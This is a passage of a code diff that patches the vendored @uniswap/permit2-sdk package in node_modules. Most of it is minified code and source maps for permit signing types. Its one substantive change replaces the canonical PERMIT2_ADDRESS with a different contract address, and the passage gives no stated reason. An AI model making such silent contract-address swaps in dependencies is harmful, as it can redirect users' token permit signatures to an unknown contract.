witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    } else {\n      permit.permitted.forEach(validateTokenPermissions)\n      const types = witness ? permitBatchTransferFromWithWitnessType(witness) : PERMIT_BATCH_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    }\n  }\n\n  public static hash(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): string {\n    const { domain, types, values } = SignatureTransfer.getPermitData(permit, permit2Address, chainId, witness)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validateTokenPermissions(permissions: TokenPermissions) {\n  invariant(MaxSignatureTransferAmount.gte(permissions.amount), 'AMOUNT_OUT_OF_RANGE')\n}\n","import { BigNumber } from '@ethersproject/bignumber'\nimport { Provider } from '@ethersproject/providers'\nimport Permit2Abi from '../../abis/Permit2.json'\nimport { Contract } from '@ethersproject/contracts'\n\nexport interface AllowanceData {\n  amount: BigNumber\n  nonce: number\n  expiration: number\n}\n\nexport class AllowanceProvider {\n  private permit2: Contract\n\n  constructor(private provider: Provider, private permit2Address: string) {\n    this.permit2 = new Contract(this.permit2Address, Permit2Abi, this.provider)\n  }\n\n  async getAllowanceData(token: string, owner: string, spender: string): Promise<AllowanceData> {\n    return await this.permit2.allowance(owner, token, spender)\n  }\n\n  async getAllowance(token: string, owner: string, spender: string): Promise<BigNumber> {\n    return (await this.getAllowanceData(token, owner, spender)).amount\n  }\n\n  async getNonce(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).nonce\n  }\n\n  async getExpiration(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).expiration\n  }\n}\n"],"names":["MaxUint48","BigNumber","from","MaxUint160","MaxUint256","MaxAllowanceTransferAmount","MaxAllowanceExpiration","MaxOrderedNonce","MaxSignatureTransferAmount","MaxUnorderedNonce","MaxSigDeadline","InstantExpiration","permit2Domain","permit2Address","chainId","name","verifyingContract","PERMIT_DETAILS","type","PERMIT_TYPES","PermitSingle","PermitDetails","PERMIT_BATCH_TYPES","PermitBatch","AllowanceTransfer","getPermitData","permit","gte","sigDeadline","invariant","domain","Array","isArray","details","isPermit","validatePermitDetails","types","values","forEach","hash","_TypedDataEncoder","nonce","amount","expiration","TOKEN_PERMISSIONS","PERMIT_TRANSFER_FROM_TYPES","PermitTransferFrom","TokenPermissions","PERMIT_BATCH_TRANSFER_FROM_TYPES","PermitBatchTransferFrom","SignatureTransfer","witness","deadline","permitted","isPermitTransferFrom","validateTokenPermissions","PermitWitnessTransferFrom","witnessTypeName","witnessType","permitTransferFromWithWitnessType","Object","assign","PermitBatchWitnessTransferFrom","permitBatchTransferFromWithWitnessType","permissions","provider","this","permit2","Contract","Permit2Abi","_proto","getAllowanceData","token","owner","spender","_context","allowance","getAllowance","_context2","getNonce","_context3","getExpiration","_context4"],"mappings":"sQAIaA,EAAYC,YAAUC,KAAK,kBAC3BC,EAAaF,YAAUC,KAAK,8CAC5BE,EAAaH,YAAUC,KAAK,sEAI5BG,EAA6BF,EAC7BG,EAAyBN,EACzBO,EAAkBP,EAGlBQ,EAA6BJ,EAC7BK,EAAoBL,EACpBM,EAAiBN,EAEjBO,EAA+BV,YAAUC,KAAK,YCf3CU,EAAcC,EAAwBC,GACpD,MAAO,CACLC,KAJwB,UAKxBD,QAAAA,EACAE,kBAAmBH,OC8BjBI,EAAiB,CACrB,CAAEF,KAAM,QAASG,KAAM,WACvB,CAAEH,KAAM,SAAUG,KAAM,WACxB,CAAEH,KAAM,aAAcG,KAAM,UAC5B,CAAEH,KAAM,QAASG,KAAM,WAGnBC,EAAe,CACnBC,aAAc,CACZ,CAAEL,KAAM,UAAWG,KAAM,iBACzB,CAAEH,KAAM,UAAWG,KAAM,WACzB,CAAEH,KAAM,cAAeG,KAAM,YAE/BG,cAAeJ,GAGXK,EAAqB,CACzBC,YAAa,CACX,CAAER,KAAM,UAAWG,KAAM,mBACzB,CAAEH,KAAM,UAAWG,KAAM,WACzB,CAAEH,KAAM,cAAeG,KAAM,YAE/BG,cAAeJ,GAOKO,aAIpB,cAgCC,OA7BDA,EACcC,cAAP,SACLC,EACAb,EACAC,GAEUJ,EAAeiB,IAAID,EAAOE,cAApCC,MAEA,IAAMC,EAASlB,EAAcC,EAAgBC,GAC7C,OApBJ,SAAkBY,GAChB,OAAQK,MAAMC,QAAQN,EAAOO,SAmBvBC,CAASR,IACXS,EAAsBT,EAAOO,SACtB,CACLH,OAAAA,EACAM,MAAOjB,EACPkB,OAAQX,KAGVA,EAAOO,QAAQK,QAAQH,GAChB,CACLL,OAAAA,EACAM,MAAOd,EACPe,OAAQX,KAGbF,EAEae,KAAP,SAAYb,EAAoCb,EAAwBC,GAC7E,MAAkCU,EAAkBC,cAAcC,EAAQb,EAAgBC,GAC1F,OAAO0B,oBAAkBD,OADjBT,SAAQM,QAAOC,cAK3B,SAASF,EAAsBF,GACnB1B,EAAgBoB,IAAIM,EAAQQ,QAAtCZ,MACUxB,EAA2BsB,IAAIM,EAAQS,SAAjDb,MACUvB,EAAuBqB,IAAIM,EAAQU,aAA7Cd,k2NCjEIe,EAAoB,CACxB,CAAE7B,KAAM,QAASG,KAAM,WACvB,CAAEH,KAAM,SAAUG,KAAM,YAGpB2B,EAA6B,CACjCC,mBAAoB,CAClB,CAAE/B,KAAM,YAAaG,KAAM,oBAC3B,CAAEH,KAAM,UAAWG,KAAM,WACzB,CAAEH,KAAM,QAASG,KAAM,WACvB,CAAEH,KAAM,WAAYG,KAAM,YAE5B6B,iBAAkBH,GAGdI,EAAmC,CACvCC,wBAAyB,CACvB,CAAElC,KAAM,YAAaG,KAAM,sBAC3B,CAAEH,KAAM,UAAWG,KAAM,WACzB,CAAEH,KAAM,QAASG,KAAM,WACvB,CAAEH,KAAM,WAAYG,KAAM,YAE5B6B,iBAAkBH,GAmCEM,aAIpB,cA2CC,OAxCDA,EACczB,cAAP,SACLC,EACAb,EACAC,EACAqC,GAEUzC,EAAeiB,IAAID,EAAO0B,WAApCvB,MACUpB,EAAkBkB,IAAID,EAAOe,QAAvCZ,MAEA,IAAMC,EAASlB,EAAcC,EAAgBC,GAC7C,OAtBJ,SAA8BY,GAC5B,OAAQK,MAAMC,QAAQN,EAAO2B,WAqBvBC,CAAqB5B,IACvB6B,EAAyB7B,EAAO2B,WAGzB,CACLvB,OAAAA,EACAM,MAJYe,EApDpB,SAA2CA,GACzC,UACEK,0BAA2B,CACzB,CAAEzC,KAAM,YAAaG,KAAM,oBAC3B,CAAEH,KAAM,UAAWG,KAAM,WACzB,CAAEH,KAAM,QAASG,KAAM,WACvB,CAAEH,KAAM,WAAYG,KAAM,WAC1B,CAAEH,KAAM,UAAWG,KAAMiC,EAAQM,kBAEnCV,iBAAkBH,GACfO,EAAQO,aA0CeC,CAAkCR,GAAWN,EAKnER,OAJac,EAAUS,OAAOC,OAAOnC,EAAQ,CAAEyB,QAASA,EAAQA,UAAazB,KAO/EA,EAAO2B,UAAUf,QAAQiB,GAGlB,CACLzB,OAAAA,EACAM,MAJYe,EA/CpB,SAAgDA,GAC9C,UACEW,+BAAgC,CAC9B,CAAE/C,KAAM,YAAaG,KAAM,sBAC3B,CAAEH,KAAM,UAAWG,KAAM,WACzB,CAAEH,KAAM,QAASG,KAAM,WACvB,CAAEH,KAAM,WAAYG,KAAM,WAC1B,CAAEH,KAAM,UAAWG,KAAMiC,EAAQM,kBAEnCV,iBAAkBH,GACfO,EAAQO,aAqCeK,CAAuCZ,GAAWH,EAKxEX,OAJac,EAAUS,OAAOC,OAAOnC,EAAQ,CAAEyB,QAASA,EAAQA,UAAazB,KAOlFwB,EAEaX,KAAP,SACLb,EACAb,EACAC,EACAqC,GAEA,MAAkCD,EAAkBzB,cAAcC,EAAQb,EAAgBC,EAASqC,GACnG,OAAOX,oBAAkBD,OADjBT,SAAQM,QAAOC,cAK3B,SAASkB,EAAyBS,GACtBxD,EAA2BmB,IAAIqC,EAAYtB,SAArDb,4oSC1IA,WAAoBoC,EAA4BpD,GAA5BqD,cAAAD,EAA4BC,oBAAArD,EAC9CqD,KAAKC,QAAU,IAAIC,WAASF,KAAKrD,eAAgBwD,EAAYH,KAAKD,UACnE,kBAgBA,OAhBAK,EAEKC,4BAAgB,kBAAtB,WAAuBC,EAAeC,EAAeC,GAAe,6BAAA,OAAA,sBAAA,OAAA,OAAAC,SACrDT,KAAKC,QAAQS,UAAUH,EAAOD,EAAOE,GAAQ,OAAA,iCAAA,OAAA,UAAA,+BAC3D,OAAA,gBAAA,mCAAAJ,EAEKO,wBAAY,kBAAlB,WAAmBL,EAAeC,EAAeC,GAAe,6BAAA,OAAA,sBAAA,OAAA,OAAAI,SAChDZ,KAAKK,iBAAiBC,EAAOC,EAAOC,GAAQ,OAAA,gCAAEhC,QAAM,OAAA,UAAA,+BACnE,OAAA,gBAAA,mCAAA4B,EAEKS,oBAAQ,kBAAd,WAAeP,EAAeC,EAAeC,GAAe,6BAAA,OAAA,sBAAA,OAAA,OAAAM,SAC5Cd,KAAKK,iBAAiBC,EAAOC,EAAOC,GAAQ,OAAA,gCAAEjC,OAAK,OAAA,UAAA,+BAClE,OAAA,gBAAA,mCAAA6B,EAEKW,yBAAa,kBAAnB,WAAoBT,EAAeC,EAAeC,GAAe,6BAAA,OAAA,sBAAA,OAAA,OAAAQ,SACjDhB,KAAKK,iBAAiBC,EAAOC,EAAOC,GAAQ,OAAA,gCAAE/B,YAAU,OAAA,UAAA,+BACvE,OAAA,gBAAA,gXJ9B4B"}
\ No newline at end of file
diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js
index 27b08e2..bdc161c 100644
--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js
+++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js
@@ -3,7 +3,7 @@ import { _TypedDataEncoder } from '@ethersproject/hash';
 import { BigNumber } from '@ethersproject/bignumber';
 import { Contract } from '@ethersproject/contracts';
 
-var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+var PERMIT2_ADDRESS = '0x00000000BD0047637ac6BA3af44b52005ceD9557';
 var MaxUint48 = /*#__PURE__*/BigNumber.from('0xffffffffffff');
 var MaxUint160 = /*#__PURE__*/BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
 var MaxUint256 = /*#__PURE__*/BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js.map b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js.map
index d092141..27e5e94 100644
--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js.map
+++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js.map
@@ -1 +1 @@
-{"version":3,"file":"permit2-sdk.esm.js","sources":["../src/constants.ts","../src/domain.ts","../src/allowanceTransfer.ts","../src/signatureTransfer.ts","../src/providers/AllowanceProvider.ts"],"sourcesContent":["import { BigNumber } from '@ethersproject/bignumber'\n\nexport const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'\n\nexport const MaxUint48 = BigNumber.from('0xffffffffffff')\nexport const MaxUint160 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff')\nexport const MaxUint256 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n\n// alias max types for their usages\n// allowance transfer types\nexport const MaxAllowanceTransferAmount = MaxUint160\nexport const MaxAllowanceExpiration = MaxUint48\nexport const MaxOrderedNonce = MaxUint48\n\n// signature transfer types\nexport const MaxSignatureTransferAmount = MaxUint256\nexport const MaxUnorderedNonce = MaxUint256\nexport const MaxSigDeadline = MaxUint256\n\nexport const InstantExpiration: BigNumber = BigNumber.from(0)\n","import { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\n\nconst PERMIT2_DOMAIN_NAME = 'Permit2'\n\nexport function permit2Domain(permit2Address: string, chainId: number): TypedDataDomain {\n  return {\n    name: PERMIT2_DOMAIN_NAME,\n    chainId,\n    verifyingContract: permit2Address,\n  }\n}\n\nexport type PermitData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: any\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { MaxSigDeadline, MaxOrderedNonce, MaxAllowanceTransferAmount, MaxAllowanceExpiration } from './constants'\nimport { permit2Domain } from './domain'\n\nexport interface PermitDetails {\n  token: string\n  amount: BigNumberish\n  expiration: BigNumberish\n  nonce: BigNumberish\n}\n\nexport interface PermitSingle {\n  details: PermitDetails\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport interface PermitBatch {\n  details: PermitDetails[]\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport type PermitSingleData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitSingle\n}\n\nexport type PermitBatchData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatch\n}\n\nconst PERMIT_DETAILS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint160' },\n  { name: 'expiration', type: 'uint48' },\n  { name: 'nonce', type: 'uint48' },\n]\n\nconst PERMIT_TYPES = {\n  PermitSingle: [\n    { name: 'details', type: 'PermitDetails' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nconst PERMIT_BATCH_TYPES = {\n  PermitBatch: [\n    { name: 'details', type: 'PermitDetails[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nfunction isPermit(permit: PermitSingle | PermitBatch): permit is PermitSingle {\n  return !Array.isArray(permit.details)\n}\n\nexport abstract class AllowanceTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitSingle | PermitBatch,\n    permit2Address: string,\n    chainId: number\n  ): PermitSingleData | PermitBatchData {\n    invariant(MaxSigDeadline.gte(permit.sigDeadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermit(permit)) {\n      validatePermitDetails(permit.details)\n      return {\n        domain,\n        types: PERMIT_TYPES,\n        values: permit,\n      }\n    } else {\n      permit.details.forEach(validatePermitDetails)\n      return {\n        domain,\n        types: PERMIT_BATCH_TYPES,\n        values: permit,\n      }\n    }\n  }\n\n  public static hash(permit: PermitSingle | PermitBatch, permit2Address: string, chainId: number): string {\n    const { domain, types, values } = AllowanceTransfer.getPermitData(permit, permit2Address, chainId)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validatePermitDetails(details: PermitDetails) {\n  invariant(MaxOrderedNonce.gte(details.nonce), 'NONCE_OUT_OF_RANGE')\n  invariant(MaxAllowanceTransferAmount.gte(details.amount), 'AMOUNT_OUT_OF_RANGE')\n  invariant(MaxAllowanceExpiration.gte(details.expiration), 'EXPIRATION_OUT_OF_RANGE')\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { permit2Domain } from './domain'\nimport { MaxSigDeadline, MaxUnorderedNonce, MaxSignatureTransferAmount } from './constants'\n\nexport interface Witness {\n  witness: any\n  witnessTypeName: string\n  witnessType: Record<string, TypedDataField[]>\n}\n\nexport interface TokenPermissions {\n  token: string\n  amount: BigNumberish\n}\n\nexport interface PermitTransferFrom {\n  permitted: TokenPermissions\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport interface PermitBatchTransferFrom {\n  permitted: TokenPermissions[]\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport type PermitTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitTransferFrom\n}\n\nexport type PermitBatchTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatchTransferFrom\n}\n\nconst TOKEN_PERMISSIONS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint256' },\n]\n\nconst PERMIT_TRANSFER_FROM_TYPES = {\n  PermitTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nconst PERMIT_BATCH_TRANSFER_FROM_TYPES = {\n  PermitBatchTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nfunction permitTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction permitBatchTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitBatchWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions[]' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction isPermitTransferFrom(permit: PermitTransferFrom | PermitBatchTransferFrom): permit is PermitTransferFrom {\n  return !Array.isArray(permit.permitted)\n}\n\nexport abstract class SignatureTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): PermitTransferFromData | PermitBatchTransferFromData {\n    invariant(MaxSigDeadline.gte(permit.deadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n    invariant(MaxUnorderedNonce.gte(permit.nonce), 'NONCE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermitTransferFrom(permit)) {\n      validateTokenPermissions(permit.permitted)\n      const types = witness ? permitTransferFromWithWitnessType(witness) : PERMIT_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    } else {\n      permit.permitted.forEach(validateTokenPermissions)\n      const types = witness ? permitBatchTransferFromWithWitnessType(witness) : PERMIT_BATCH_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    }\n  }\n\n  public static hash(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): string {\n    const { domain, types, values } = SignatureTransfer.getPermitData(permit, permit2Address, chainId, witness)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validateTokenPermissions(permissions: TokenPermissions) {\n  invariant(MaxSignatureTransferAmount.gte(permissions.amount), 'AMOUNT_OUT_OF_RANGE')\n}\n","import { BigNumber } from '@ethersproject/bignumber'\nimport { Provider } from '@ethersproject/providers'\nimport Permit2Abi from '../../abis/Permit2.json'\nimport { Contract } from '@ethersproject/contracts'\n\nexport interface AllowanceData {\n  amount: BigNumber\n  nonce: number\n  expiration: number\n}\n\nexport class AllowanceProvider {\n  private permit2: Contract\n\n  constructor(private provider: Provider, private permit2Address: string) {\n    this.permit2 = new Contract(this.permit2Address, Permit2Abi, this.provider)\n  }\n\n  async getAllowanceData(token: string, owner: string, spender: string): Promise<AllowanceData> {\n    return await this.permit2.allowance(owner, token, spender)\n  }\n\n  async getAllowance(token: string, owner: string, spender: string): Promise<BigNumber> {\n    return (await this.getAllowanceData(token, owner, spender)).amount\n  }\n\n  async getNonce(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).nonce\n  }\n\n  async getExpiration(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).expiration\n  }\n}\n"],"names":["PERMIT2_ADDRESS","MaxUint48","BigNumber","from","MaxUint160","MaxUint256","MaxAllowanceTransferAmount","MaxAllowanceExpiration","MaxOrderedNonce","MaxSignatureTransferAmount","MaxUnorderedNonce","MaxSigDeadline","InstantExpiration","PERMIT2_DOMAIN_NAME","permit2Domain","permit2Address","chainId","name","verifyingContract","PERMIT_DETAILS","type","PERMIT_TYPES","PermitSingle","PermitDetails","PERMIT_BATCH_TYPES","PermitBatch","isPermit","permit","Array","isArray","details","AllowanceTransfer","getPermitData","gte","sigDeadline","invariant","domain","validatePermitDetails","types","values","forEach","hash","_TypedDataEncoder","nonce","amount","expiration","TOKEN_PERMISSIONS","PERMIT_TRANSFER_FROM_TYPES","PermitTransferFrom","TokenPermissions","PERMIT_BATCH_TRANSFER_FROM_TYPES","PermitBatchTransferFrom","permitTransferFromWithWitnessType","witness","PermitWitnessTransferFrom","witnessTypeName","witnessType","permitBatchTransferFromWithWitnessType","PermitBatchWitnessTransferFrom","isPermitTransferFrom","permitted","SignatureTransfer","deadline","validateTokenPermissions","Object","assign","permissions","AllowanceProvider","provider","permit2","Contract","Permit2Abi","getAllowanceData","token","owner","spender","allowance","getAllowance","getNonce","getExpiration"],"mappings":"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